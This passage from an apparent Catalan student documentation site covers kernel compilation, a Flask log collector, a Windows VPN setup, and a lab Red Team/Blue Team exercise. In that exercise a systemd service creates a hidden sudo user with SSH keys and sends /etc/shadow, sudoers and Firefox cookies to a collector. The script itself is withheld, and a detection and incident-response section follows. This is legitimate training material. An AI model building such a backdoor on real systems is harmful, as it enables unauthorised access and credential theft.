comunicar-se directament amb el maquinari.</p> <p>El kernel realitza funcions essencials com:</p> <ul> <li>Gesti\u00f3 de processos i assignaci\u00f3 de CPU.</li> <li>Gesti\u00f3 de la mem\u00f2ria i control de l\u2019espai d\u2019adreces.</li> <li>Control i comunicaci\u00f3 amb dispositius mitjan\u00e7ant drivers.</li> <li>Gesti\u00f3 de sistemes de fitxers i operacions d\u2019E/S.</li> <li>Implementaci\u00f3 de seguretat, permisos i a\u00efllament.</li> <li>Control de la xarxa, protocols i comunicacions.</li> </ul> <p>El kernel pot ampliar la seva funcionalitat mitjan\u00e7ant m\u00f2duls (fitxers <code>.ko</code>), que es poden carregar o descarregar en temps real. Aquests m\u00f2duls poden estar integrats dins del kernel (Y), compilats com a m\u00f2duls independents (M) o desactivats (N), segons la configuraci\u00f3 establerta al fitxer <code>.config</code>.</p> <p>Modificar i compilar el kernel permet personalitzar caracter\u00edstiques, optimitzar el rendiment o afegir funcionalitats, per\u00f2 tamb\u00e9 requereix precauci\u00f3, ja que canvis incorrectes poden afectar el funcionament global del sistema.</p> <p>En aquesta pr\u00e0ctica aprendrem a:</p> <ul> <li>Descarregar i preparar un nou kernel.</li> <li>Modificar fitxers interns i crear parches.</li> <li>Gestionar opcions del <code>.config</code> (Y/M/N).</li> <li>Compilar el kernel amb configuraci\u00f3 pr\u00f2pia.</li> <li>Mostrar diversos kernels al GRUB.</li> </ul>"},{"location":"unidad1/kernel/#comprovar-la-versio-del-kernel","title":"Comprovar la versi\u00f3 del kernel","text":"<p>Per veure la versi\u00f3 actual utilitzem la comanda: 'uname -r'</p> <p>Exemple: 6.14.0-35-generic</p> <p></p>"},{"location":"unidad1/kernel/#descarregar-un-kernel-de-kernelorg","title":"Descarregar un kernel de kernel.org","text":"<p>Accedim a la p\u00e0gina: https://cdn.kernel.org/pub/linux/kernel/v6.x/</p> <p>Descarreguem, per exemple, la versi\u00f3 6.14.1.</p> <p></p> <p>Descomprimim el fitxer.</p> <p></p>"},{"location":"unidad1/kernel/#preparar-el-sistema-per-compilar","title":"Preparar el sistema per compilar","text":"<p>Paquets necessaris: 'sudo apt install -y build-essential libncurses-dev flex bison openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf dwarves'</p>"},{"location":"unidad1/kernel/#ubuntu-2204-repositoris-de-codi-font","title":"Ubuntu 22.04 \u2013 repositoris de codi font","text":"<p>Afegir: deb-src http://archive.ubuntu.com/ubuntu jammy main restricted universe multiverse deb-src http://archive.ubuntu.com/ubuntu jammy-updates main restricted universe multiverse deb-src http://archive.ubuntu.com/ubuntu jammy-security main restricted universe multiverse</p>"},{"location":"unidad1/kernel/#ubuntu-2404-repositoris-de-codi-font","title":"Ubuntu 24.04 \u2013 repositoris de codi font","text":"<p>Afegir: deb-src http://archive.ubuntu.com/ubuntu noble main restricted universe multiverse deb-src http://archive.ubuntu.com/ubuntu noble-updates main restricted universe multiverse deb-src http://archive.ubuntu.com/ubuntu noble-security main restricted universe multiverse</p> <p>Descomentem l\u00ednies i fem: 'apt update'</p> <p></p>"},{"location":"unidad1/kernel/#modificar-el-codi-font-del-kernel","title":"Modificar el codi font del kernel","text":"<p>Fem una c\u00f2pia de main.c per no tocar l\u2019original.</p> <p></p> <p>Afegim una l\u00ednia nova: pr_notice(\"hola exemple\");</p> <p></p>"},{"location":"unidad1/kernel/#crear-un-parche-amb-diff","title":"Crear un parche amb diff","text":"<p>Fem un diff entre el fitxer original i el modificat: 'diff -u fitxer_original fitxer_modificat'</p> <p>Aix\u00f2 genera un <code>.patch</code> amb nom\u00e9s els canvis.</p> <p></p>"},{"location":"unidad1/kernel/#copiar-el-config-del-kernel-actual","title":"Copiar el <code>.config</code> del kernel actual","text":"<p>A /boot hi ha la configuraci\u00f3 dels kernels instal\u00b7lats:</p> <p>Exemple: config-6.14.0-32-generic config-6.14.0-34-generic System.map-6.14.0-32-generic vmlinuz-6.14.0-34-generic initrd.img-6.14.0-34-generic  </p> <p>Copiem el <code>.config</code> que sabem que funciona dins el directori del kernel nou.</p> <p></p>"},{"location":"unidad1/kernel/#reconfigurar-el-kernel-amb-oldconfig","title":"Reconfigurar el kernel amb oldconfig","text":"<p>Executem: 'make oldconfig'</p> <p>Nom\u00e9s preguntar\u00e0 opcions noves que no existien a la versi\u00f3 anterior.</p> <p></p>"},{"location":"unidad1/kernel/#activar-i-desactivar-opcions-del-kernel","title":"Activar i desactivar opcions del kernel","text":"<p>Editem <code>.config</code> i canviem: - Y = integrat al kernel - M = compilat com a m\u00f2dul - N = desactivat</p> <p>Podem activar o desactivar drivers i funcionalitats segons necessitat.</p> <p></p>"},{"location":"unidad1/kernel/#editar-grub-per-mostrar-el-menu","title":"Editar GRUB per mostrar el men\u00fa","text":"<p>A /etc/default/grub comentem: GRUB_TIMEOUT_STYLE=hidden GRUB_TIMEOUT=0  </p> <p>Aix\u00ed mostrarem el men\u00fa de GRUB en arrencar.</p> <p></p> <p>Actualitzem el GRUB: 'update-grub'</p> <p></p>"},{"location":"unidad1/kernel/#installacio-del-kernel-compilat","title":"Instal\u00b7laci\u00f3 del kernel compilat","text":"<p>Despr\u00e9s d\u2019esperar unes 3 o 4 hores, el nostre kernel finalment ha acabat la compilaci\u00f3!</p> <p></p> <p>Un cop generats els paquets <code>.deb</code>, procedim a instal\u00b7lar-los:</p> <p></p> <p>Despr\u00e9s instal\u00b7lem el kernel i els headers i actualitzem el GRUB amb la comanda: 'update-grub'</p> <p></p> <p>Quan reiniciem el sistema, al men\u00fa d\u2019arrencada ja ens apareix el nostre kernel personalitzat i compilat manualment.</p> <p></p> <p>Per comprovar que el nostre canvi amb <code>pr_notice()</code> funciona realment dins del kernel, utilitzem l\u2019eina <code>dmesg</code> per mostrar els missatges generats durant l\u2019arrencada. Si el nostre kernel personalitzat s\u2019ha compilat i carregat correctament, el missatge apareixer\u00e0 al log:</p> <p>dmesg | grep -i hola</p> <p></p> <p>Sortida:</p> <p>[    0.023581] hola vitaliy.</p> <p>Aix\u00f2 confirma que el codi modificat forma part del kernel i que s\u2019executa durant el proc\u00e9s d\u2019arrencada.</p>"},{"location":"unidad1/menuconfig/","title":"Complilaci\u00f3 amb menuconfig","text":""},{"location":"unidad1/menuconfig/#configuracio-del-kernel-amb-make-menuconfig","title":"Configuraci\u00f3 del kernel amb make menuconfig","text":"<p>El kernel de Linux \u00e9s altament configurable gr\u00e0cies al sistema Kconfig, que permet seleccionar quines funcionalitats, protocols, drivers i sistemes de fitxers s\u2019inclouran en la compilaci\u00f3 final. Encara que totes les opcions es guarden dins del fitxer <code>.config</code>, la manera m\u00e9s pr\u00e0ctica i visual d\u2019ajustar-les \u00e9s utilitzant la interf\u00edcie interactiva <code>make menuconfig</code>. Aquest sistema ens permet activar i desactivar drivers, decidir si un component s\u2019inclou directament al kernel (Y) o es compila com a m\u00f2dul (M), desactivar completament funcionalitats com USB, \u00e0udio o IPv6 (N) i personalitzar el kernel segons necessitats d\u2019optimitzaci\u00f3, seguretat o demostraci\u00f3.</p>"},{"location":"unidad1/menuconfig/#comprovar-la-versio-actual-del-kernel","title":"Comprovar la versi\u00f3 actual del kernel","text":"<p>Per verificar la versi\u00f3 del kernel que utilitza el sistema executem la comanda: <pre><code>uname -r\n</code></pre></p> <p>Exemple de sortida: 6.14.0-35-generic</p> <p></p>"},{"location":"unidad1/menuconfig/#descarregar-un-kernel-des-de-kernelorg","title":"Descarregar un kernel des de kernel.org","text":"<p>Accedim a la p\u00e0gina oficial: https://cdn.kernel.org/pub/linux/kernel/v6.x/</p> <p>En aquest cas descarreguem la versi\u00f3 6.14.1.</p> <p></p> <p>Un cop descarregat, descomprimim el fitxer:</p> <p></p>"},{"location":"unidad1/menuconfig/#configuracio-amb-make-menuconfig","title":"Configuraci\u00f3 amb <code>\"make menuconfig\"</code>","text":"<p>Ens situem dins del directori del kernel que hem descarregat i executem: <pre><code>make menuconfig\n</code></pre></p> <p>Aquesta ordre obrir\u00e0 la interf\u00edcie de configuraci\u00f3 en mode text, on podem activar o desactivar opcions del kernel segons les nostres necessitats.</p> <p></p> <p>En el meu cas, he decidit desactivar el Ethernet driver support i com el nostre driver es el de Intel el desactivem, deixant el kernel sense suport de xarxa:</p> <p></p> <p>Tamb\u00e9 he desactivat:</p> <ul> <li>Sound card support</li> <li>USB support</li> </ul> <p>Aix\u00f2 permet demostrar clarament els efectes dels canvis despr\u00e9s de la compilaci\u00f3, ja que el sistema no detectar\u00e0 USBs, ni \u00e0udio, ni interf\u00edcies de xarxa.</p> <p></p> <p>Quan acabem de modificar les opcions, guardem la configuraci\u00f3 i sortim del men\u00fa:</p> <p></p> <p></p>"},{"location":"unidad1/menuconfig/#compilacio-del-kernel","title":"Compilaci\u00f3 del kernel","text":"<p>Finalment, procedim a compilar el kernel amb la comanda: <pre><code>sudo make -j$(nproc)\n</code></pre> Aquesta ordre utilitza tots els nuclis disponibles per accelerar la compilaci\u00f3. El proc\u00e9s pot trigar entre 30 minuts i 4 hores, depenent de la pot\u00e8ncia de la m\u00e0quina o m\u00e0quina virtual.</p> <p></p>"},{"location":"unidad1/menuconfig/#installacio-del-kernel-compilat","title":"Instal\u00b7laci\u00f3 del kernel compilat","text":"<p>Un cop completada la compilaci\u00f3, nom\u00e9s queda instal\u00b7lar el nou kernel i deixar-lo llest per utilitzar al sistema.</p> <p>Instal\u00b7lar els m\u00f2duls del kernel</p> <p>Primer executem la comanda <code>sudo make modules_install</code> i esperem que els m\u00f2duls es copi\u00efn al directori corresponent:</p> <p><code>/lib/modules/&lt;versi\u00f3_del_kernel&gt;</code></p> <p></p> <p>Generar els paquets <code>.deb</code></p> <p>Per crear els paquets Debian del kernel utilitzarem la comanda <code>sudo make bindeb-pkg</code>. Aquesta ordre empaqueta el kernel, els headers i les llibreries necess\u00e0ries en fitxers <code>.deb</code>, que es generen un directori per sobre (<code>../</code>).</p> <p></p> <p>Quan acabi el proc\u00e9s, podrem veure els arxius <code>.deb</code> generats:</p> <p></p> <p>Instal\u00b7lar els paquets del kernel</p> <p>Instal\u00b7lem els paquets amb les ordres:</p> <ul> <li> <p><code>sudo dpkg -i linux-image-*.deb</code></p> </li> <li> <p><code>sudo dpkg -i linux-headers-*.deb</code></p> </li> </ul> <p>Aix\u00f2 instal\u00b7lar\u00e0 el nostre kernel personalitzat i tots els fitxers necessaris per al seu funcionament.</p> <p></p> <p></p> <p>Actualitzar GRUB i reiniciar</p> <p>Perqu\u00e8 el sistema reconegui el nou kernel, actualitzem GRUB amb la comanda <code>sudo update-grub</code>.</p> <p>Finalment, reiniciem l\u2019equip amb <code>sudo reboot</code>.</p> <p>Despr\u00e9s de reiniciar, podrem seleccionar el nostre kernel personalitzat des del men\u00fa d\u2019opcions avan\u00e7ades de GRUB.</p> <p>Quan el sistema es reinicia podrem observar si s'ha aplicat, l'\u00e0udio per algun motiu no s'ha desactivat per\u00f2 s\u00ed la xarxa.</p> <p></p>"},{"location":"unidad1/unidad/","title":"Blue Team","text":""},{"location":"unidad1/unidad/#part-del-servidor","title":"Part del servidor","text":"<p>Per aquest apartat he decidit implementar tant la part de Blue Team com la de Red Team.</p> <p>En primer lloc, he creat un contenidor Docker en un altre equip amb Ubuntu Desktop, que actuar\u00e0 com a servidor. Dins d\u2019aquest contenidor he desenvolupat una API encarregada de rebre informaci\u00f3. Com que ja s\u00e9 quin tipus de dades cal capturar, he creat una p\u00e0gina web amb Flask i HTML per mostrar-les de manera visual.</p>"},{"location":"unidad1/unidad/#part-del-client","title":"Part del client","text":"<p>Pel que fa al client, cal executar la comanda:</p> <pre><code>nano /etc/systemd/system/client.service\n</code></pre> <p>A continuaci\u00f3, s\u2019han d\u2019introduir els par\u00e0metres que es mostren a la imatge adjunta.</p> <p></p> <p>Posteriorment, crearem l\u2019script .sh amb les dades que volem recollir. Aquest script es desar\u00e0 a la ruta:</p> <pre><code>nano /usr/local/bin/client-logs.sh\n</code></pre> <p></p> <p>La seva funci\u00f3 principal \u00e9s obtenir informaci\u00f3 sobre la m\u00e0quina, aix\u00ed com registrar els logs dels errors cr\u00edtics i tamb\u00e9 els intents fallits d\u2019acc\u00e9s per SSH.</p>"},{"location":"unidad1/unidad/#execucio-de-lscript","title":"Execuci\u00f3 de l\u2019script","text":"<p>Un cop creat l\u2019script, li donem permisos d\u2019execuci\u00f3 amb la comanda: <pre><code>chmod +x nom_del_script.sh\n</code></pre></p>"},{"location":"unidad1/unidad/#configuracio-del-servei","title":"Configuraci\u00f3 del servei","text":"<p>Despr\u00e9s, reiniciem el daemon-reload i activem el servei: <pre><code>sudo systemctl daemon-reload\n</code></pre> <pre><code>sudo systemctl enable client.service\n</code></pre></p> <p>En aquest punt podem reiniciar el proc\u00e9s manualment o b\u00e9 reiniciar directament l\u2019equip.</p>"},{"location":"unidad1/unidad/#verificacio-al-servidor","title":"Verificaci\u00f3 al servidor","text":"<p>Ara ens dirigim al nostre servidor receptor de la informaci\u00f3. 1. Obrim el navegador. 2. Introdu\u00efm la IP del nostre PC seguida del port 5000.  </p> <p>A la p\u00e0gina web creada amb Flask, podem observar:  </p> <ul> <li>La informaci\u00f3 de l\u2019ordinador.  </li> </ul> <p></p> <ul> <li>Els errors cr\u00edtics registrats.  </li> </ul> <p></p> <ul> <li>Els intents fallits d\u2019acc\u00e9s SSH.  </li> </ul> <p></p>"},{"location":"unidad1/unidad2/","title":"Red Team","text":"<p>En aquest apartat actuarem com a atacants, formant part d'un red team. L'objectiu de la pr\u00e0ctica \u00e9s desplegar un servei que instal\u00b7li i habiliti acc\u00e9s remot mitjan\u00e7ant SSH: crear\u00e0 un usuari local amb privilegis administratius, permetr\u00e0 l'acc\u00e9s per SSH i enviar\u00e0 la informaci\u00f3 rellevant a una API personalitzada perqu\u00e8 es mostri al panell web.</p> <p>Disclaimer: Aquesta activitat nom\u00e9s s'ha de realitzar en un entorn controlat i autoritzat (per exemple, VMs en un laboratori amb snapshots). No aplicar mai en equips de producci\u00f3 ni en m\u00e0quines alienes.</p>"},{"location":"unidad1/unidad2/#creacio-del-servei","title":"Creaci\u00f3 del servei","text":"<p>Crear la unitat systemd</p> <p>Desprendre el fitxer del servei a la ruta <code>/etc/systemd/system/create-admin.service</code>:</p> <pre><code>nano /etc/systemd/system/create-admin.service\n</code></pre> <p></p>"},{"location":"unidad1/unidad2/#crear-lscript","title":"Crear l'script","text":"<p>A continuaci\u00f3, es crea l'script que realitzar\u00e0 l'acci\u00f3 (script <code>.sh</code>). Per raons de seguretat no s'inclou el codi font en aquest document. Aquest arxiu s'ha d'ubicar a:</p> <pre><code>nano /usr/local/bin/create_admin.sh\n</code></pre> <p></p> <p>Assignar permisos d'execuci\u00f3</p> <p>Cal donar permisos d'execuci\u00f3 a l'script perqu\u00e8 el servei pugui executar-lo:</p> <p></p> <p>Habilitar i iniciar el servei</p> <p>Un cop instal\u00b7lat el servei i l'script: - Recarregar el daemon de systemd - Habilitar el servei perqu\u00e8 s'executi a l'arrencada - Iniciar el servei (o reiniciar la m\u00e0quina) per fer que s'executi</p> <p></p>"},{"location":"unidad1/unidad2/#resultat-i-visualitzacio","title":"Resultat i visualitzaci\u00f3","text":"<p>Un cop el proc\u00e9s s'ha executat correctament, al servidor receptor d'informaci\u00f3 (el collector) i al seu panell web podreu veure la notificaci\u00f3:</p> <ul> <li>S'ha creat el nou usuari administratiu</li> <li>Es mostra la contrasenya generada (si s'ha creat)</li> <li>Es mostra la IP i el nom del sistema</li> <li>Hi ha un bot\u00f3 per copiar la comanda SSH (<code>ssh usuari@ip</code>) i connectar-se des d'un terminal</li> </ul> <p></p> <p>Com que el mecanisme \u00e9s autom\u00e0tic i basat en blocs, es pot desplegar en m\u00faltiples equips del laboratori; per cada m\u00e0quina registrarem la data i hora de la creaci\u00f3, el nom de l'equip, la IP, l'usuari i la contrasenya.</p>"},{"location":"unidad1/unidad2/#script-millorat","title":"Script millorat","text":"<p>Ja hem vist que el script ens ha creat l'usuari admin i ens ha donat acc\u00e9s a la m\u00e0quina, per\u00f2 ara l'hem millorat. Com sempre, no ensenyar\u00e9 el script per temes \u00e8tics i perqu\u00e8 la gent ho podria utilitzar per fer coses malicioses. Aquesta documentaci\u00f3 \u00e9s purament informativa i educativa.</p> <p>Automatitzaci\u00f3 de creaci\u00f3 d'usuari administrador i enviament de dades</p> <p>Aquest apartat documenta el proc\u00e9s de desplegament i les millores realitzades al script <code>create_admin.sh</code> i al servei systemd <code>create-admin.service</code> per garantir que l'usuari <code>vdomin</code> es crea correctament i que les dades del sistema s'envien al collector despr\u00e9s de cada reinici.</p> <p>Objectiu</p> <ul> <li>Crear autom\u00e0ticament l'usuari <code>vdomin</code> amb permisos de sudo</li> <li>Generar i instal\u00b7lar claus SSH</li> <li>Exportar fitxers cr\u00edtics del sistema (<code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code>, <code>/etc/sudoers</code>)</li> <li>Enviar la informaci\u00f3 b\u00e0sica del sistema (hostname, IP, uptime, usuari, contrasenya) via API REST al servidor collector</li> <li>Garantir que el proc\u00e9s s'executa de manera fiable despr\u00e9s de cada reinici del sistema</li> </ul>"},{"location":"unidad1/unidad2/#problemes-trobats","title":"Problemes trobats","text":"<p>Execuci\u00f3 massa r\u00e0pida en l'arrencada</p> <ul> <li>El servei s'executava abans que la xarxa estigu\u00e9s disponible</li> <li>Resultat: el <code>curl</code> fallava i no s'enviaven dades al collector</li> </ul> <p></p> <p>Carpeta de dades buida</p> <ul> <li>Inicialment s'intentava enviar un directori <code>.tar.gz</code> que es buidava massa aviat</li> <li>Millora: consolidar dades en un sol <code>.txt</code> abans d'enviar-les</li> </ul> <p>IP buida o incorrecta</p> <ul> <li>En alguns entorns, <code>hostname -I</code> no retornava cap adre\u00e7a IP</li> <li>Soluci\u00f3: afegir fallback amb <code>ip route get</code></li> </ul> <p></p>"},{"location":"unidad1/unidad2/#millores-implementades-al-script-create_adminsh","title":"Millores implementades al script <code>create_admin.sh</code>","text":"<ul> <li>Afegit <code>sleep 30</code> al principi per assegurar que:</li> <li>La xarxa estigui operativa</li> <li>Els serveis b\u00e0sics estiguin carregats</li> </ul> <ul> <li>Consolidaci\u00f3 de dades en un \u00fanic <code>.txt</code>:</li> <li>Fitxers <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code>, <code>/etc/sudoers</code></li> <li>Informaci\u00f3 de xarxa (<code>ip addr</code>, <code>ss -tuln</code>)</li> <li>Possibilitat d'afegir escaneig de ports (<code>nmap</code>) per futures millores</li> </ul>"},{"location":"unidad1/unidad2/#resultat","title":"Resultat","text":"<p>Al reiniciar el client esperem uns segons i podem observar que ens ha enviat la informaci\u00f3 per fer una connexi\u00f3 SSH.</p> <p>Intentem fer la connexi\u00f3 i ha estat exitosa.</p> <p></p> <p>Tamb\u00e9 podem observar que ens ha enviat el fitxer <code>.txt</code> amb les dades que hem indicat.</p> <p></p> <p>El descarreguem i el podem obrir per comprovar quins usuaris existeixen, els ports oberts i altres dades d\u2019inter\u00e8s.</p> <p></p> <p>En cas que nmap no estigu\u00e9s instal\u00b7lat, ens retornaria els ports que estan escoltant actualment.</p> <p></p>"},{"location":"unidad1/unidad2/#millores-20","title":"Millores 2.0","text":"<p>A m\u00e9s del que ja hav\u00edem implementat, m\u2019han reptat a anar m\u00e9s enll\u00e0. Per aix\u00f2, he millorat l\u2019script perqu\u00e8 ara tamb\u00e9 exporta les cookies de sessi\u00f3 del navegador Firefox i les dades de navegaci\u00f3.</p> <p></p> <p></p> <p>Per a les cookies, he afegit un check per comprovar si s\u2019han exportat correctament.</p> <p></p> <p>El problema \u00e9s que les cookies estan xifrades, i per poder-les llegir necessitem utilitzar un programa espec\u00edfic de Firefox per desxifrar-les i visualitzar-les correctament.</p> <p></p> <ul> <li>\"Nota t\u00e8cnica\"     El xifratge de les cookies \u00e9s una mesura de seguretat per protegir les sessions d'usuari.     Tot i que les cookies es poden exportar des del fitxer <code>cookies.sqlite</code>, el seu <code>value</code> pot estar xifrat amb la clau que es guarda al perfil de Firefox (<code>key4.db</code>).</li> </ul>"},{"location":"unidad1/unidad3/","title":"Creaci\u00f3 del target","text":""},{"location":"unidad1/unidad3/#creacio-del-target-personalitzat","title":"Creaci\u00f3 del target personalitzat","text":""},{"location":"unidad1/unidad3/#que-es-un-target-en-entorn-linux","title":"Qu\u00e8 \u00e9s un target en entorn Linux?","text":"<p>En Linux, un target \u00e9s una unitat especial de systemd que serveix per agrupar altres unitats com ara serveis (<code>.service</code>), punts de muntatge (<code>.mount</code>), o sockets (<code>.socket</code>). El seu objectiu \u00e9s aconseguir un estat determinat del sistema durant l\u2019arrencada o el funcionament.</p> <p>Per exemple: - <code>graphical.target</code> inicia el sistema amb interf\u00edcie gr\u00e0fica. - <code>multi-user.target</code> inicia el sistema en mode consola multiusuari. - <code>rescue.target</code> s\u2019utilitza per a tasques de manteniment.</p> <p>Crear un target personalitzat permet definir un entorn d\u2019inici espec\u00edfic, ideal per a laboratoris, configuracions automatitzades o entorns d\u2019administraci\u00f3.</p>"},{"location":"unidad1/unidad3/#creacio-del-target-lab-admin-setuptarget","title":"Creaci\u00f3 del target <code>lab-admin-setup.target</code>","text":"<p>Hem creat el target personalitzat anomenat <code>lab-admin-setup.target</code>.</p> <p></p>"},{"location":"unidad1/unidad3/#creacio-del-servei-associat","title":"Creaci\u00f3 del servei associat","text":"<p>S\u2019ha creat el fitxer <code>/etc/systemd/system/create-admin.service</code>, el qual est\u00e0 vinculat al nostre target personalitzat.</p> <p></p>"},{"location":"unidad1/unidad3/#assignacio-del-target-com-a-predeterminat","title":"Assignaci\u00f3 del target com a predeterminat","text":"<p>A continuaci\u00f3 s\u2019han executat les ordres per comprovar i establir el target per defecte:</p> <ol> <li>Comprovar el target actual amb <code>systemctl get-default</code>.  </li> <li>Establir el nou target com a predeterminat amb <code>systemctl set-default lab-admin-setup.target</code>.  </li> <li>Tornar a comprovar que el canvi s\u2019ha aplicat correctament.</li> </ol> <p></p>"},{"location":"unidad1/unidad3/#absencia-dinterficie-grafica","title":"Abs\u00e8ncia d\u2019interf\u00edcie gr\u00e0fica","text":"<p>En iniciar la sessi\u00f3 \u00e9s possible que no aparegui la interf\u00edcie gr\u00e0fica, ja que el target personalitzat no carrega el mode gr\u00e0fic per defecte. Per solucionar-ho, es pot canviar al target gr\u00e0fic predeterminat.</p> <p></p> <p>\"Nota t\u00e8cnica\"     Els targets s\u00f3n essencials per controlar l\u2019ordre i la manera com s\u2019inicien els serveis del sistema.     Crear un target personalitzat \u00e9s especialment \u00fatil per definir entorns d\u2019inici adaptats a tasques concretes, com ara configuracions d\u2019administraci\u00f3 o laboratoris automatitzats.</p>"},{"location":"unidad1/unidad4/","title":"Resposta a l'incident: backdoor i exfiltraci\u00f3 de dades","text":"<p>Hem fet tasques de blue team i red team: s'ha executat un codi que ens ha creat una backdoor i ha exfiltrat dades crucials del nostre ordinador. Com a administradors de sistema, cal saber detectar i reaccionar r\u00e0pidament.</p> <p>He creat un script que detecta comportaments estranys a l'equip que estem analitzant (aix\u00f2 no garanteix que funcioni en tots els casos). Li he donat permisos d'execuci\u00f3 i l'he executat.</p> <p></p> <p>Aquesta captura aporta molta informaci\u00f3: hi ha serveis estranys en execuci\u00f3, s'ha detectat un usuari amb acc\u00e9s shell, hi ha un fitxer <code>authorized_keys</code> sospit\u00f3s i els fitxers dins de <code>/usr/local/bin</code> han estat modificats durant l'\u00faltima setmana. Ara que tenim aquestes evid\u00e8ncies, podem investigar.</p> <p>Fem un <code>cat</code> del <code>authorized_keys</code> per comprovar si cont\u00e9 alguna de les nostres claus; en aquest cas no \u00e9s cap de les nostres i l'hem esborrat.</p> <p></p> <p>Posteriorment fem un <code>ls</code> filtrant amb <code>grep</code> per revisar serveis i targets, i tamb\u00e9 es mostra que n'hi ha tres que no haurien d'estar.</p> <p></p> <p>Executem una cerca amb <code>find</code> i l'opci\u00f3 <code>-mtime -7</code> per llistar quins arxius han estat creats o modificats durant els \u00faltims dies dins de <code>/usr/local/bin</code>.</p> <p></p> <p>Finalment, hem trobat un usuari que no hem afegit nosaltres; segons la pol\u00edtica d'incidents, el podem bloquejar o esborrar (prenant abans c\u00f2pies per evid\u00e8ncia).</p> <p></p>"},{"location":"unidad1/unidad4/#observacions-i-bones-practiques-rapides","title":"Observacions i bones pr\u00e0ctiques r\u00e0pides","text":"<ul> <li>Contenci\u00f3 immediata: a\u00eflla la m\u00e0quina de la xarxa per evitar m\u00e9s exfiltraci\u00f3.  </li> <li>Preservar evid\u00e8ncies: abans d'esborrar, guarda c\u00f2pies de <code>authorized_keys</code>, unitats systemd sospitoses i fitxers alterats per a l'an\u00e0lisi forense.  </li> <li>Comprovacions b\u00e0siques a realitzar: processos en execuci\u00f3 (<code>ps</code>), ports oberts (<code>ss</code>/<code>netstat</code>), serveis systemd (<code>systemctl</code>), crontabs, <code>~/.ssh/authorized_keys</code> i fitxers amb timestamps recents en rutes sensibles com <code>/usr/local/bin</code>.  </li> <li>Accions sobre comptes/claus sospitoses: documenta-ho tot; despr\u00e9s elimina o bloqueja les claus i comptes no autoritzats.  </li> <li>Automatitzaci\u00f3: utilitza scripts per detecci\u00f3 inicial, per\u00f2 recorda que no substitueixen una investigaci\u00f3 forense manual quan cal.  </li> <li>Rotaci\u00f3 i revisi\u00f3: despr\u00e9s d'erradicar, rota credencials i revisa la integritat dels binaris i la configuraci\u00f3 del sistema.</li> </ul>"},{"location":"unidad1/vpnwindows/","title":"VPN en Windows Server: Configuraci\u00f3 i demostraci\u00f3","text":""},{"location":"unidad1/vpnwindows/#introduccio","title":"Introducci\u00f3","text":"<p>Una VPN (Virtual Private Network) permet crear una connexi\u00f3 segura entre un client i una xarxa remota a trav\u00e9s d'Internet mitjan\u00e7ant un t\u00fanel xifrat. Aix\u00f2 garanteix la confidencialitat i integritat de les dades transmeses.</p>"},{"location":"unidad1/vpnwindows/#avantatges-de-vpn-en-windows-server","title":"Avantatges de VPN en Windows Server","text":"<p>A difer\u00e8ncia de solucions comercials com OpenVPN o WireGuard, la VPN integrada en Windows Server ofereix:</p> Caracter\u00edstica Descripci\u00f3 Control per usuari Permisos individuals d'acc\u00e9s remot Autenticaci\u00f3 centralitzada Integraci\u00f3 amb Active Directory Acc\u00e9s a recursos interns Carpetes compartides, servidors i serveis Ideal per a entorns Corporatius i educatius"},{"location":"unidad1/vpnwindows/#escenari-de-la-demostracio","title":"Escenari de la demostraci\u00f3","text":""},{"location":"unidad1/vpnwindows/#infraestructura","title":"Infraestructura","text":"<p>El servidor Windows Server 2025 disposa de:</p> <ul> <li>Interf\u00edcie externa (ISP): <code>10.10.1.0/24</code></li> <li>Interf\u00edcie interna: <code>192.168.2.0/24</code></li> <li>Dos discos durs (un pel sistema, un per dades)</li> </ul> <p></p>"},{"location":"unidad1/vpnwindows/#configuracio-dadreces-ip","title":"Configuraci\u00f3 d'adreces IP","text":"<p>Assignem adreces IP est\u00e0tiques a les dues interf\u00edcies:</p> <p></p> <p></p>"},{"location":"unidad1/vpnwindows/#installacio-dels-rols-necessaris","title":"Instal\u00b7laci\u00f3 dels rols necessaris","text":"<p>Des del Server Manager, accedim a Agregar rols i caracter\u00edstiques:</p> <p></p> <p></p> <p></p>"},{"location":"unidad1/vpnwindows/#rols-a-installar","title":"Rols a instal\u00b7lar","text":"<ul> <li>Active Directory Domain Services</li> <li>Network Policy and Access Services</li> <li>Remote Access</li> </ul> <p>Dins de Remote Access, activem:</p> <ul> <li>DirectAccess and VPN</li> <li>Routing</li> </ul> <p></p>"},{"location":"unidad1/vpnwindows/#configuracio-de-rras-routing-and-remote-access","title":"Configuraci\u00f3 de RRAS (Routing and Remote Access)","text":"<p>Obrim Enrutament i acc\u00e9s remot, fem clic dret sobre el servidor i iniciem la configuraci\u00f3:</p> <p></p> <p>Seleccionem Acc\u00e9s remot:</p> <p></p> <p>Triem VPN:</p> <p></p> <p>Indiquem la interf\u00edcie externa (<code>10.10.1.1</code>):</p> <p></p> <p>Configurem el pool d'adreces IP per als clients VPN:</p> <p></p>"},{"location":"unidad1/vpnwindows/#configuracio-de-ports-pptp","title":"Configuraci\u00f3 de ports PPTP","text":"<p>\u00c9s essencial configurar els ports PPTP. A Ports, fem clic dret i assignem 10 ports disponibles:</p> <p></p>"},{"location":"unidad1/vpnwindows/#creacio-dusuaris","title":"Creaci\u00f3 d'usuaris","text":"<p>Creem dos usuaris de prova:</p> <ul> <li>Vitaliy</li> <li>Anna</li> </ul> <p></p> <p>A cada usuari activem Allow remote access:</p> <p></p>"},{"location":"unidad1/vpnwindows/#carpetes-compartides","title":"Carpetes compartides","text":"<p>Al disc secundari, creem directoris personals amb permisos individuals:</p> Carpeta Usuari amb acc\u00e9s Vitaliy Nom\u00e9s Vitaliy Anna Nom\u00e9s Anna <p></p> <p></p>"},{"location":"unidad1/vpnwindows/#configuracio-del-client-vpn","title":"Configuraci\u00f3 del client VPN","text":"<p>Al client Windows, afegim dues connexions VPN:</p> <p>Connexi\u00f3 de Vitaliy:</p> <p></p> <p>Connexi\u00f3 d'Anna:</p> <p></p>"},{"location":"unidad1/vpnwindows/#comprovacions","title":"Comprovacions","text":""},{"location":"unidad1/vpnwindows/#connexio-vpn-establerta","title":"Connexi\u00f3 VPN establerta","text":"<p>Ens connectem amb l'usuari Anna:</p> <p></p> <p>L'adre\u00e7a IP del client ha canviat correctament:</p> <p></p>"},{"location":"unidad1/vpnwindows/#acces-a-recursos-compartits","title":"Acc\u00e9s a recursos compartits","text":"<p>Anna pot accedir al seu directori:</p> <p></p> <p>Per\u00f2 no pot accedir al directori de Vitaliy (permisos denegats):</p> 